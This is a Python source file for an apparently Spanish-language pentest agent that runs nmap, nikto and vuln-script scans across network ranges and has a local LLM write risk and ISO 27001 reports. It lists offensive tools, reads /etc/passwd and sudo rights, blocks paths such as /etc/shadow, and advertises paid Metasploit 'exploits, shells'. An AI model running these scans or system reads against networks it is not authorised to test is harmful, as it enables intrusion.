#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║         HADES-LOCAL v1.1 — Autonomous Security Agent            ║
║     Heuristic Automated Data & Execution System (Local)         ║
║  Compatible: Kali Linux | Parrot/Purple OS | Ubuntu | Debian    ║
╚══════════════════════════════════════════════════════════════════╝

USO:
    python3 hades_local.py start              → Shell interactivo
    python3 hades_local.py start --auto       → Modo autónomo
    python3 hades_local.py scan <TARGET>      → Escaneo rápido
    python3 hades_local.py fullaudit <RANGE>  → Auditoría completa automática
    python3 hades_local.py audit <TARGET>     → Auditoría ISO 27001
    python3 hades_local.py analyze <FILE>     → Análisis forense
    python3 hades_local.py stop               → Detener agente
    python3 hades_local.py status             → Estado del agente
    python3 hades_local.py tools              → Herramientas detectadas
"""

import os, sys, json, time, signal, shutil, subprocess, argparse, re, shlex
from datetime import datetime
from pathlib import Path

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
HADES_VERSION  = "2.1.0-REDTEAM"


def _ollama_candidates():
    """URLs base candidatas, en orden de prioridad, para autodetectar Ollama
    en cualquier entorno: Linux nativo (Kali/Parrot/Purple/Ubuntu/Debian),
    WSL2 sobre Windows, o VM en VirtualBox/VMware con NAT."""
    import os as _os, re as _re, subprocess as _sp
    cands = []
    # 1. Override explícito del usuario (HADES_OLLAMA_URL u OLLAMA_HOST)
    env = _os.environ.get("HADES_OLLAMA_URL") or _os.environ.get("OLLAMA_HOST")
    if env:
        if not env.startswith("http"):
            env = "http://" + env
        host_part = env.split("//", 1)[1]
        if ":" not in host_part:
            env += ":11434"
        cands.append(env.rstrip("/"))
    # 2. Mismo equipo: Ollama instalado en el propio Linux (caso más común)
    cands += ["http://127.0.0.1:11434", "http://localhost:11434"]
    # 3. WSL2: el host Windows es el nameserver de /etc/resolv.conf
    try:
        with open("/etc/resolv.conf") as f:
            for line in f:
                if line.startswith("nameserver"):
                    ip = line.split()[1].strip()
                    if ip and not ip.startswith("127."):
                        cands.append("http://%s:11434" % ip)
                    break
    except Exception:
        pass
    # 4. WSL2 moderno / Docker Desktop
    cands.append("http://host.docker.internal:11434")
    # 5. VirtualBox/VMware NAT: el host es el gateway por defecto
    try:
        out = _sp.run(["ip", "route"], capture_output=True,
                       text=True, timeout=3).stdout
        m = _re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            cands.append("http://%s:11434" % m.group(1))
    except Exception:
        pass
    cands.append("http://10.0.2.2:11434")  # gateway NAT clásico de VirtualBox
    seen, uniq = set(), []
    for c in cands:
        if c not in seen:
            seen.add(c)
            uniq.append(c)
    return uniq


def resolve_ollama_base():
    """Primera URL base de Ollama que responde a /api/tags, o fallback local."""
    import urllib.request
    for base in _ollama_candidates():
        try:
            with urllib.request.urlopen(base + "/api/tags", timeout=2) as r:
                if getattr(r, "status", 200) == 200:
                    return base
        except Exception:
            continue
    return "http://127.0.0.1:11434"  # fallback sensato (Ollama local)


OLLAMA_BASE    = resolve_ollama_base()
OLLAMA_URL     = OLLAMA_BASE + "/api/generate"
HADES_MODEL    = "HADES-AUTO"
FALLBACK_MODEL = "qwen2.5:7b"
PID_FILE       = str(Path.home() / ".hades_local.pid")
LOG_FILE       = str(Path.home() / ".hades_local.log")
REPORT_DIR     = Path.home() / "hades_reports"
OLLAMA_TIMEOUT = 300  # 5 minutos — evita timeout en modelos lentos

class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    BLUE="\033[94m"; CYAN="\033[96m"; WHITE="\033[97m"
    BOLD="\033[1m"; DIM="\033[2m"; RESET="\033[0m"

BANNER = f"""
{C.RED}{C.BOLD}
 ██╗  ██╗ █████╗ ██████╗ ███████╗███████╗
 ██║  ██║██╔══██╗██╔══██╗██╔════╝██╔════╝
 ███████║███████║██║  ██║█████╗  ███████╗
 ██╔══██║██╔══██║██║  ██║██╔══╝  ╚════██║
 ██║  ██║██║  ██║██████╔╝███████╗███████║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝
{C.RESET}{C.CYAN}       LOCAL SECURITY AGENT v{HADES_VERSION}
{C.DIM}  Heuristic Automated Data & Execution System
{C.RESET}"""

# ─────────────────────────────────────────────
# DETECCIÓN DE HERRAMIENTAS Y OS
# ─────────────────────────────────────────────
TOOL_CATALOG = {
    "nmap":         {"category":"recon",   "desc":"Escáner de red y puertos"},
    "masscan":      {"category":"recon",   "desc":"Escáner masivo de puertos"},
    "netdiscover":  {"category":"recon",   "desc":"Descubrimiento ARP"},
    "whois":        {"category":"recon",   "desc":"Consultas WHOIS"},
    "dig":          {"category":"recon",   "desc":"Consultas DNS"},
    "nikto":        {"category":"web",     "desc":"Escáner vulnerabilidades web"},
    "dirb":         {"category":"web",     "desc":"Fuerza bruta directorios"},
    "gobuster":     {"category":"web",     "desc":"Fuerza bruta DNS/web"},
    "sqlmap":       {"category":"web",     "desc":"Inyección SQL"},
    "whatweb":      {"category":"web",     "desc":"Identificación tecnologías web"},
    "wfuzz":        {"category":"web",     "desc":"Fuzzing web"},
    "msfconsole":   {"category":"exploit", "desc":"Metasploit Framework"},
    "searchsploit": {"category":"exploit", "desc":"Base de datos exploits"},
    "tshark":       {"category":"traffic", "desc":"Análisis de tráfico"},
    "tcpdump":      {"category":"traffic", "desc":"Captura de paquetes"},
    "wireshark":    {"category":"traffic", "desc":"Análisis visual paquetes"},
    "netstat":      {"category":"traffic", "desc":"Conexiones activas"},
    "ss":           {"category":"traffic", "desc":"Estadísticas sockets"},
    "aircrack-ng":  {"category":"wifi",    "desc":"Suite auditoría WiFi"},
    "airodump-ng":  {"category":"wifi",    "desc":"Captura handshakes WiFi"},
    "aireplay-ng":  {"category":"wifi",    "desc":"Inyección paquetes WiFi"},
    "iwconfig":     {"category":"wifi",    "desc":"Config interfaces inalámbricas"},
    "john":         {"category":"crack",   "desc":"John the Ripper"},
    "hashcat":      {"category":"crack",   "desc":"Cracking de hashes"},
    "hydra":        {"category":"crack",   "desc":"Fuerza bruta servicios"},
    "hashid":       {"category":"crack",   "desc":"Identificación de hashes"},
    "volatility3":  {"category":"forensic","desc":"Forense de memoria"},
    "binwalk":      {"category":"forensic","desc":"Análisis de firmware"},
    "strings":      {"category":"forensic","desc":"Extracción de strings"},
    "file":         {"category":"forensic","desc":"Identificación de archivos"},
    "exiftool":     {"category":"forensic","desc":"Metadatos de archivos"},
    "gdb":          {"category":"reverse", "desc":"Debugger GNU"},
    "radare2":      {"category":"reverse", "desc":"Framework reversing"},
    "objdump":      {"category":"reverse", "desc":"Desensamblado binarios"},
    "curl":         {"category":"misc",    "desc":"Cliente HTTP"},
    "wget":         {"category":"misc",    "desc":"Descargador HTTP"},
    "python3":      {"category":"misc",    "desc":"Python 3"},
    "git":          {"category":"misc",    "desc":"Control de versiones"},
    "openssl":      {"category":"misc",    "desc":"Toolkit SSL/TLS"},
    "gpg":          {"category":"misc",    "desc":"Cifrado PGP"},
    # ── RED TEAM ──────────────────────────────────────────────────
    "sqlmap":       {"category":"redteam", "desc":"SQL injection automatizado"},
    "gobuster":     {"category":"redteam", "desc":"Fuerza bruta directorios/DNS"},
    "feroxbuster":  {"category":"redteam", "desc":"Fuerza bruta directorios rápido"},
    "netexec":      {"category":"redteam", "desc":"Swiss army knife SMB/WinRM/LDAP"},
    "crackmapexec": {"category":"redteam", "desc":"Post-explotación SMB/AD (legacy)"},
    "responder":    {"category":"redteam", "desc":"Captura credenciales LLMNR/NBT-NS"},
    "evil-winrm":   {"category":"redteam", "desc":"Shell WinRM para post-explotación"},
    "impacket-secretsdump": {"category":"redteam", "desc":"Dump de hashes SAM/NTDS"},
    "impacket-psexec":      {"category":"redteam", "desc":"Ejecución remota SMB"},
    "impacket-wmiexec":     {"category":"redteam", "desc":"Ejecución remota WMI"},
    "impacket-smbclient":   {"category":"redteam", "desc":"Cliente SMB Impacket"},
    "theHarvester": {"category":"redteam", "desc":"OSINT recolección de datos"},
    "enum4linux":   {"category":"redteam", "desc":"Enumeración SMB/Samba"},
    "enum4linux-ng":{"category":"redteam", "desc":"Enumeración SMB/AD moderna"},
    "smbclient":    {"category":"redteam", "desc":"Cliente SMB nativo"},
    "rpcclient":    {"category":"redteam", "desc":"Herramienta RPC para SMB"},
    "ldapsearch":   {"category":"redteam", "desc":"Consultas LDAP/AD"},
    "bloodhound-python": {"category":"redteam", "desc":"Recolector BloodHound para AD"},
    "certipy-ad":   {"category":"redteam", "desc":"Ataques a AD Certificate Services"},
    "chisel":       {"category":"redteam", "desc":"Tunneling TCP/UDP"},
    "ligolo-ng":    {"category":"redteam", "desc":"Pivoting avanzado"},
    "msfvenom":     {"category":"redteam", "desc":"Generador de payloads Metasploit"},
    "setoolkit":    {"category":"redteam", "desc":"Social Engineering Toolkit"},
    "wpscan":       {"category":"redteam", "desc":"Escáner vulnerabilidades WordPress"},
    "nuclei":       {"category":"redteam", "desc":"Escáner de vulnerabilidades rápido"},
    "ffuf":         {"category":"redteam", "desc":"Fuzzer web rápido"},
    "hydra":        {"category":"crack",   "desc":"Fuerza bruta servicios de red"},
}

def detect_tools():
    return {t: m for t, m in TOOL_CATALOG.items() if shutil.which(t)}

def detect_os():
    try:
        with open("/etc/os-release") as f:
            c = f.read().lower()
        for k in ["kali","parrot","purple","ubuntu","debian","arch"]:
            if k in c: return k
    except: pass
    return "linux"

# Supported full Red Team OSes for FREE edition
_REDTEAM_OS = {"kali", "parrot", "purple"}

def _os_tier() -> str:
    """Returns 'full' on Kali/Parrot/Purple, 'limited' on any other OS."""
    return "full" if detect_os() in _REDTEAM_OS else "limited"

def _require_full_tier():
    """Print upgrade notice and exit if not running on a supported Red Team OS."""
    if _os_tier() != "full":
        os_name = detect_os().upper()
        print(f"\n{C.YELLOW}{C.BOLD}[HADES FREE]{C.RESET} {C.YELLOW}Esta función requiere Kali Linux, Parrot OS o Purple Linux.{C.RESET}")
        print(f"{C.DIM}  SO detectado: {os_name}{C.RESET}")
        print(f"{C.DIM}  Las capacidades Red Team completas están disponibles en HADES PRO / HADES CORE.{C.RESET}")
        print(f"{C.DIM}  https://github.com/Lordhades26/hades_local{C.RESET}\n")
        sys.exit(1)

# ─────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────
def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    colors = {"INFO":C.CYAN,"OK":C.GREEN,"WARN":C.YELLOW,"ERROR":C.RED,"HADES":C.RED+C.BOLD}
    color = colors.get(level, C.WHITE)
    line = f"{C.DIM}[{ts}]{C.RESET} {color}[{level}]{C.RESET} {msg}"
    print(line)
    try:
        with open(LOG_FILE,"a") as f:
            f.write(f"[{datetime.now().isoformat()}][{level}] {msg}\n")
    except: pass

def log_ok(m):   log(m,"OK")
def log_warn(m): log(m,"WARN")
def log_err(m):  log(m,"ERROR")
def log_h(m):    log(m,"HADES")

# ─────────────────────────────────────────────
# OLLAMA ENGINE — con retry y timeout extendido
# ─────────────────────────────────────────────
def check_ollama():
    import urllib.request
    tags_url = OLLAMA_URL.replace("/api/generate", "/api/tags")
    try:
        with urllib.request.urlopen(tags_url, timeout=10) as r:
            data = json.loads(r.read())
            models = [m["name"].split(":")[0] for m in data.get("models",[])]
            for m in [HADES_MODEL, FALLBACK_MODEL] + models:
                if m.split(":")[0] in models:
                    return m.split(":")[0]
    except: pass
    return None

def ask_hades(prompt, model=None, timeout=None):
    import urllib.request, urllib.error
    if timeout is None: timeout = OLLAMA_TIMEOUT
    if model is None:   model = HADES_MODEL

    # Limitar prompt para evitar timeouts
    prompt = prompt[:6000]

    payload = json.dumps({
        "model": model,
        "prompt": prompt,
        "stream": False,
        "options": {"temperature":0.3,"top_p":0.9,"num_predict":800}
    }).encode()

    req = urllib.request.Request(
        OLLAMA_URL, data=payload,
        headers={"Content-Type":"application/json"}, method="POST"
    )

    for attempt in range(2):  # 2 intentos
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read()).get("response","").strip()
        except urllib.error.URLError as e:
            if attempt == 0:
                log_warn(f"Ollama: reintentando... ({e})")
                time.sleep(3)
            else:
                log_err(f"Ollama no responde: {e}")
        except Exception as e:
            log_err(f"Error Ollama: {e}")
            break
    return None

# ─────────────────────────────────────────────
# EJECUCIÓN DE COMANDOS
# ─────────────────────────────────────────────
def run_cmd(cmd, timeout=180):
    log(f"Ejecutando: {C.YELLOW}{cmd}{C.RESET}")
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", f"[TIMEOUT {timeout}s]", -1
    except Exception as e:
        return "", str(e), -1

def run_tool(tool, args, timeout=180):
    if not shutil.which(tool):
        return None, f"'{tool}' no instalado.", 1
    return run_cmd(f"{tool} {args}", timeout)

# ─────────────────────────────────────────────
# VALIDACIÓN DE ENTRADA
# ─────────────────────────────────────────────
_CIDR_RE   = re.compile(r'^\d{1,3}(\.\d{1,3}){3}(/\d{1,2})?$')
_TARGET_RE = re.compile(r'^[a-zA-Z0-9._:\[\]-]{1,255}$')

def _validate_target(target):
    t = target.strip()
    if not t:
        raise ValueError("Target vacío")
    if _CIDR_RE.match(t) or _TARGET_RE.match(t):
        return t
    raise ValueError(f"Target contiene caracteres no permitidos: '{t}'")

def _validate_filepath(filepath):
    p = Path(filepath).resolve()
    sensitive = {Path("/etc/shadow"), Path("/etc/sudoers"), Path("/etc/gshadow")}
    if p in sensitive:
        raise ValueError(f"Acceso denegado: {p}")
    return p

# ─────────────────────────────────────────────
# PARSER DE NMAP — extrae hosts y servicios
# ─────────────────────────────────────────────
def parse_nmap_hosts(nmap_output):
    """
    Parsea output de nmap y retorna lista de:
    {"ip": "x.x.x.x", "ports": [{"port":"80","service":"http","version":"..."}]}
    """
    hosts = []
    current = None

    for line in nmap_output.splitlines():
        # Nuevo host
        m = re.match(r"Nmap scan report for (?:[\w.-]+ \()?(\d+\.\d+\.\d+\.\d+)\)?", line)
        if m:
            if current: hosts.append(current)
            current = {"ip": m.group(1), "ports": [], "raw": ""}
            continue

        if current is None: continue
        current["raw"] += line + "\n"

        # Puerto abierto
        m = re.match(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
        if m:
            current["ports"].append({
                "port": m.group(1),
                "service": m.group(2),
                "version": m.group(3).strip()
            })

    if current: hosts.append(current)
    return hosts

# ─────────────────────────────────────────────
# MÓDULO DE AUDITORÍA AUTOMÁTICA COMPLETA
# ─────────────────────────────────────────────
class HadesEngine:
    def __init__(self):
        self.tools = detect_tools()
        self.os_profile = detect_os()
        self.model = check_ollama()
        self.findings = []
        REPORT_DIR.mkdir(exist_ok=True)

    def _has(self, t): return t in self.tools

    def _get_machine_id(self) -> str:
        """Genera Machine ID unico para mostrar en el cuadro de upgrade."""
        import hashlib, uuid, socket
        try:
            mac = hex(uuid.getnode())[2:].zfill(12)
        except Exception:
            mac = "000000000000"
        try:
            host = socket.gethostname()
        except Exception:
            host = "unknown"
        return hashlib.sha256(f"{mac}:{host}".encode()).hexdigest()[:16]

    def _show_upgrade_box(self) -> None:
        """Muestra cuadro de upgrade a HADES PRO al iniciar la sesion."""
        mid = self._get_machine_id()
        wsl = False
        try:
            wsl = "microsoft" in open("/proc/version").read().lower()
        except Exception:
            pass

        Y   = "\033[93m\033[1m"
        G   = "\033[92m"
        Cy  = "\033[96m"
        W   = "\033[97m"
        R   = "\033[0m"
        sep = "=" * 58

        print(f"\n{Y}+{sep}+{R}")
        print(f"{Y}|{'  ACTUALIZA A HADES PRO — Version completa':^58}|{R}")
        print(f"{Y}+{sep}+{R}")
        print(f"{W}|  {'Desbloquea en HADES PRO:':<56}|{R}")
        print(f"{W}|  {'  IA local Ollama — seleccion de modelo':<56}|{R}")
        print(f"{W}|  {'  Metasploit integrado (synflood, exploits, shells)':<56}|{R}")
        print(f"{W}|  {'  Auditoria ISO 27001 con reporte ejecutivo':<56}|{R}")
        print(f"{W}|  {'  si / si a todo / cancelar (confirmaciones pro)':<56}|{R}")
        if wsl:
            print(f"{W}|  {'  38+ herramientas en Kali nativo (vs ~15 en WSL)':<56}|{R}")
        else:
            print(f"{W}|  {'  38+ herramientas completas en Kali Linux':<56}|{R}")
        print(f"{Y}+{sep}+{R}")
        print(f"{G}|  {'Precio: $10 USD — Pago unico, licencia vitalicia':<56}|{R}")
        print(f"{G}|  {'Contacto: [EMAIL/TELEGRAM — proximamente]':<56}|{R}")
        print(f"{Y}+{sep}+{R}")
        print(f"{Cy}|  {'Tu Machine ID (necesario al contactar):':<56}|{R}")
        print(f"{Cy}|  {mid:<56}|{R}")
        if wsl:
            print(f"{Y}+{sep}+{R}")
            print(f"{Y}|  {'NOTA WSL: Arsenal completo solo en Kali Linux nativo':<56}|{R}")
        print(f"{Y}+{sep}+{R}\n")

    def _ask(self, prompt, timeout=None):
        if not self.model:
            log_err("Ollama no disponible.")
            return None
        return ask_hades(prompt, self.model, timeout)

    def _save_report(self, name, content):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = REPORT_DIR / f"hades_{name}_{ts}.md"
        path.write_text(content, encoding="utf-8")
        log_ok(f"Reporte guardado: {path}")
        return path

    def _tools_summary(self):
        cats = {}
        for t, m in self.tools.items():
            cats.setdefault(m["category"],[]).append(t)
        return "\n".join(f"  [{c.upper()}]: {', '.join(ts)}" for c,ts in cats.items())

    # ── ESCANEO RÁPIDO ─────────────────────────
    def quick_scan(self, target):
        try:
            target = _validate_target(target)
        except ValueError as e:
            log_err(f"Target inválido: {e}"); return
        log_h(f"ESCANEO RÁPIDO: {target}")
        if not self._has("nmap"):
            log_warn("nmap no disponible.")
            return
        stdout, _, _ = run_tool("nmap", f"-sV -T4 --top-ports 1000 {shlex.quote(target)}", timeout=120)
        print(f"\n{C.YELLOW}[NMAP QUICK]{C.RESET}\n{stdout[:2000]}")
        analysis = self._ask(
            f"Analiza este escaneo nmap. Máximo 6 líneas. "
            f"Identifica puertos críticos y riesgo:\n{stdout[:2000]}"
        )
        if analysis:
            print(f"\n{C.CYAN}{analysis}{C.RESET}\n")

    # ── RECONOCIMIENTO ─────────────────────────
    def recon(self, target):
        try:
            target = _validate_target(target)
        except ValueError as e:
            log_err(f"Target inválido: {e}"); return {}, None
        log_h(f"RECONOCIMIENTO: {target}")
        findings = {}

        if self._has("nmap"):
            stdout, _, _ = run_tool("nmap", f"-sV -sC -T4 --open {shlex.quote(target)}", timeout=240)
            findings["nmap"] = stdout
            print(f"\n{C.YELLOW}[NMAP OUTPUT]{C.RESET}\n{stdout[:3000]}")
        else:
            stdout, _, _ = run_cmd("ss -tulnp")
            findings["ss"] = stdout

        if self._has("whois") and not any(target.startswith(p) for p in ["192.","10.","172."]):
            stdout, _, _ = run_tool("whois", shlex.quote(target), 30)
            findings["whois"] = stdout[:500]

        raw = json.dumps(findings, ensure_ascii=False)[:3000]
        analysis = self._ask(
            f"Eres HADES, analista de seguridad. Analiza reconocimiento de {target}:\n{raw}\n\n"
            f"Responde con: 1)Superficie de ataque 2)Servicios críticos 3)Vulnerabilidades potenciales "
            f"4)Próximos pasos 5)Nivel de riesgo: BAJO/MEDIO/ALTO/CRÍTICO"
        )
        if analysis:
            log_h("ANÁLISIS IA:")
            print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
            self.findings.append({"phase":"recon","target":target,"analysis":analysis})

        return findings, analysis

    # ── AUDITORÍA COMPLETA AUTOMÁTICA ──────────
    def full_audit(self, network_range):
        """
        Flujo completo automático:
        1. Descubrir hosts activos
        2. Por cada host: escaneo de puertos + servicios
        3. Análisis de vulnerabilidades por servicio
        4. Nikto en servicios web
        5. Análisis SSL en HTTPS
        6. Análisis IA de cada host
        7. Reporte Markdown completo
        """
        try:
            network_range = _validate_target(network_range)
        except ValueError as e:
            log_err(f"Rango de red inválido: {e}"); return
        log_h(f"AUDITORÍA COMPLETA iniciada: {network_range}")
        log_warn("Este proceso puede tomar varios minutos...")

        report = []
        report.append(f"# HADES — Informe de Seguridad\n")
        report.append(f"**Red auditada:** `{network_range}`  ")
        report.append(f"**Fecha:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ")
        report.append(f"**Agente:** HADES-LOCAL v{HADES_VERSION}  ")
        report.append(f"**Modelo IA:** {self.model or 'No disponible'}\n")
        report.append("---\n")

        # ── FASE 1: Descubrimiento de hosts ───
        log_h("FASE 1 — Descubrimiento de hosts activos")
        report.append("## Fase 1 — Descubrimiento de Hosts\n")

        if self._has("nmap"):
            stdout, _, _ = run_tool("nmap", f"-sn {shlex.quote(network_range)}", timeout=60)
            active_ips = re.findall(r"Nmap scan report for (?:[\w.-]+ \()?(\d+\.\d+\.\d+\.\d+)\)?", stdout)
            report.append(f"**Hosts activos encontrados:** {len(active_ips)}\n")
            for ip in active_ips:
                report.append(f"- `{ip}`")
            report.append("")
            print(f"\n{C.GREEN}Hosts activos: {active_ips}{C.RESET}\n")
        else:
            log_err("nmap requerido para auditoría completa.")
            return

        if not active_ips:
            log_warn("No se encontraron hosts activos.")
            return

        # ── FASE 2: Auditoría por host ─────────
        host_summaries = []

        for ip in active_ips:
            log_h(f"FASE 2 — Auditando host: {ip}")
            report.append(f"\n---\n## Host: `{ip}`\n")
            host_data = {"ip": ip, "ports": [], "vulns": [], "risk": "DESCONOCIDO"}

            # Escaneo completo de puertos y servicios
            log(f"Escaneando puertos y servicios en {ip}...")
            stdout, _, _ = run_tool("nmap", f"-sV -sC -T4 --open -p- {shlex.quote(ip)}", timeout=300)
            hosts_parsed = parse_nmap_hosts(stdout)
            host_info = next((h for h in hosts_parsed if h["ip"] == ip), None)

            if host_info and host_info["ports"]:
                host_data["ports"] = host_info["ports"]
                report.append(f"### Puertos y Servicios\n")
                report.append("| Puerto | Servicio | Versión |")
                report.append("|--------|----------|---------|")
                for p in host_info["ports"]:
                    report.append(f"| {p['port']}/tcp | {p['service']} | {p['version']} |")
                report.append("")

            # Escaneo de vulnerabilidades con nmap scripts
            log(f"Escaneando vulnerabilidades en {ip}...")
            vuln_out, _, _ = run_tool(
                "nmap", f"--script vuln -T4 --open {shlex.quote(ip)}", timeout=300
            )
            vuln_matches = re.findall(r"(CVE-\d{4}-\d+|VULNERABLE|LIKELY VULNERABLE)", vuln_out, re.IGNORECASE)
            if vuln_matches:
                host_data["vulns"] = list(set(vuln_matches))
                report.append(f"### Vulnerabilidades Detectadas (nmap --script vuln)\n")
                report.append(f"```\n{vuln_out[:2000]}\n```\n")
            else:
                report.append(f"### Vulnerabilidades\nNo se detectaron CVEs conocidos con nmap.\n")

            # Nikto en servicios HTTP
            http_ports = [p for p in host_data["ports"] if p["service"] in ["http","http-alt","ssl/http"]]
            for hp in http_ports[:2]:  # máximo 2 puertos web por host
                proto = "https" if "ssl" in hp["service"] else "http"
                url = f"{proto}://{ip}:{hp['port']}"
                log(f"Nikto en {url}...")
                if self._has("nikto"):
                    nikto_out, _, _ = run_tool("nikto", f"-h {shlex.quote(url)} -maxtime 60", timeout=90)
                    report.append(f"### Nikto — {url}\n```\n{nikto_out[:1500]}\n```\n")

            # SSL check
            ssl_ports = [p for p in host_data["ports"] if "ssl" in p["service"] or p["port"] in ["443","8443","8000"]]
            for sp in ssl_ports[:1]:
                log(f"Verificando SSL en {ip}:{sp['port']}...")
                ssl_out, _, _ = run_cmd(
                    f"echo | openssl s_client -connect {shlex.quote(ip)}:{shlex.quote(sp['port'])} -brief 2>&1 | head -20"
                )
                report.append(f"### SSL/TLS — Puerto {sp['port']}\n```\n{ssl_out[:500]}\n```\n")

            # Análisis IA del host
            log(f"Analizando {ip} con HADES-IA...")
            host_context = (
                f"IP: {ip}\n"
                f"Puertos: {json.dumps(host_data['ports'])}\n"
                f"CVEs encontrados: {host_data['vulns']}\n"
                f"Extracto nmap vuln:\n{vuln_out[:1000]}"
            )
            ai_analysis = self._ask(
                f"Eres HADES, experto en ciberseguridad ISO 27001. Analiza este host:\n\n"
                f"{host_context}\n\n"
                f"Proporciona:\n"
                f"1. Nivel de riesgo: BAJO/MEDIO/ALTO/CRÍTICO\n"
                f"2. Vulnerabilidades críticas identificadas\n"
                f"3. Vectores de ataque probables\n"
                f"4. Recomendaciones de remediación concretas\n"
                f"5. Controles ISO 27001 aplicables (Anexo A)\n"
                f"Sé técnico y conciso. Máximo 300 palabras.",
                timeout=300
            )

            if ai_analysis:
                host_data["ai_analysis"] = ai_analysis
                report.append(f"### Análisis HADES-IA\n{ai_analysis}\n")
                # Extraer nivel de riesgo
                for nivel in ["CRÍTICO","ALTO","MEDIO","BAJO"]:
                    if nivel in ai_analysis.upper():
                        host_data["risk"] = nivel
                        break

            host_summaries.append(host_data)
            log_ok(f"Host {ip} auditado. Riesgo: {host_data['risk']}")

        # ── FASE 3: Resumen ejecutivo ──────────
        log_h("FASE 3 — Generando resumen ejecutivo...")
        report.append("\n---\n## Resumen Ejecutivo\n")

        summary_data = json.dumps([
            {"ip": h["ip"], "ports": len(h["ports"]), "vulns": h["vulns"], "risk": h["risk"]}
            for h in host_summaries
        ], ensure_ascii=False)

        exec_summary = self._ask(
            f"Eres HADES. Genera un resumen ejecutivo para un CISO sobre esta auditoría de red {network_range}:\n\n"
            f"{summary_data}\n\n"
            f"Incluye: 1)Hallazgos críticos prioritarios 2)Superficie de ataque total "
            f"3)Recomendaciones top 5 ordenadas por urgencia 4)Cumplimiento ISO 27001. "
            f"Tono ejecutivo y técnico. Máximo 400 palabras.",
            timeout=300
        )

        if exec_summary:
            report.append(exec_summary)
            print(f"\n{C.BOLD}{'='*60}{C.RESET}")
            print(f"{C.RED}{C.BOLD}RESUMEN EJECUTIVO HADES{C.RESET}")
            print(f"{C.BOLD}{'='*60}{C.RESET}")
            print(f"{C.CYAN}{exec_summary}{C.RESET}\n")

        # Tabla resumen de hosts
        report.append("\n### Tabla de Riesgos\n")
        report.append("| IP | Puertos Abiertos | CVEs | Riesgo |")
        report.append("|----|-----------------|------|--------|")
        risk_colors = {"CRÍTICO":"🔴","ALTO":"🟠","MEDIO":"🟡","BAJO":"🟢","DESCONOCIDO":"⚪"}
        for h in host_summaries:
            icon = risk_colors.get(h["risk"],"⚪")
            cves = ", ".join(h["vulns"][:3]) if h["vulns"] else "Ninguno"
            report.append(f"| `{h['ip']}` | {len(h['ports'])} | {cves} | {icon} {h['risk']} |")

        # Guardar reporte
        full_report = "\n".join(report)
        path = self._save_report("full_audit", full_report)

        print(f"\n{C.GREEN}{C.BOLD}✅ AUDITORÍA COMPLETA{C.RESET}")
        print(f"   Hosts auditados : {len(host_summaries)}")
        print(f"   Reporte guardado: {path}\n")

        return path

    # ── AUDITORÍA ISO 27001 ────────────────────
    def audit_iso27001(self, target):
        try:
            target = _validate_target(target)
        except ValueError as e:
            log_err(f"Target inválido: {e}"); return None
        log_h(f"AUDITORÍA ISO 27001 — {target}")
        report = [f"# Auditoría ISO 27001\n**Objetivo:** {target}\n**Fecha:** {datetime.now().isoformat()}\n"]

        for title, fn in [
            ("A.12.6 Gestión de Vulnerabilidades", lambda: self._audit_vulns(target)),
            ("A.13.1 Seguridad de Red",             lambda: self._audit_network(target)),
            ("A.9.4 Control de Acceso",             lambda: self._audit_access(target)),
        ]:
            log(f"Fase: {title}")
            result = fn()
            report.append(f"## {title}\n{result}\n")
            time.sleep(1)

        full = "\n".join(report)
        path = self._save_report("iso27001", full)

        summary = self._ask(
            f"Resumen ejecutivo CISO para auditoría ISO 27001 de {target}. "
            f"3 párrafos. Hallazgos y recomendaciones:\n{full[:2000]}"
        )
        if summary:
            print(f"\n{C.BOLD}RESUMEN:{C.RESET}\n{C.CYAN}{summary}{C.RESET}\n")
        return path

    def _audit_vulns(self, t):
        if self._has("nmap"):
            out, _, _ = run_tool("nmap", f"--script vuln -T4 {shlex.quote(t)}", 300)
            return f"```\n{out[:2000]}\n```"
        return "nmap no disponible."

    def _audit_network(self, t):
        r = []
        if self._has("nmap"):
            net = t if "/" in t else f"{t}/24"
            out, _, _ = run_tool("nmap", f"-sn {shlex.quote(net)}", 60)
            r.append(f"**Hosts activos:**\n```\n{out[:500]}\n```")
        out, _, _ = run_cmd("ss -tulnp")
        r.append(f"**Servicios locales:**\n```\n{out[:500]}\n```")
        return "\n".join(r)

    def _audit_access(self, t):
        r = []
        out, _, _ = run_cmd("cat /etc/passwd | grep -v nologin | grep -v false")
        r.append(f"**Usuarios con shell:**\n```\n{out[:500]}\n```")
        out, _, _ = run_cmd("sudo -l 2>/dev/null | head -20")
        r.append(f"**Privilegios sudo:**\n```\n{out[:300]}\n```")
        return "\n".join(r)

    # ── ANÁLISIS DE ARCHIVO ────────────────────
    def analyze_file(self, filepath):
        try:
            safe_path = _validate_filepath(filepath)
        except ValueError as e:
            log_err(str(e)); return
        if not safe_path.exists():
            log_err(f"Archivo no encontrado: {safe_path}")
            return
        ext = safe_path.suffix.lower()
        log_h(f"ANALIZANDO: {safe_path}")
        findings = {}

        if self._has("file"):
            out, _, _ = run_tool("file", shlex.quote(str(safe_path)))
            findings["file_type"] = out

        if ext in [".pcap",".pcapng",".cap"] and self._has("tshark"):
            out, _, _ = run_tool("tshark", f"-r {shlex.quote(str(safe_path))} -q -z io,phs", 60)
            findings["traffic"] = out[:1000]

        if ext in [".txt",".hash"] and self._has("hashid"):
            with open(safe_path) as f:
                first = f.readline().strip()
            first_safe = re.sub(r'[^a-fA-F0-9$./]', '', first)[:128]
            if first_safe:
                out, _, _ = run_tool("hashid", shlex.quote(first_safe))
                findings["hash_type"] = out

        if self._has("strings"):
            try:
                r = subprocess.run(
                    ["strings", str(safe_path)],
                    capture_output=True, text=True, timeout=30
                )
                findings["strings"] = "\n".join(r.stdout.splitlines()[:50])
            except Exception as e:
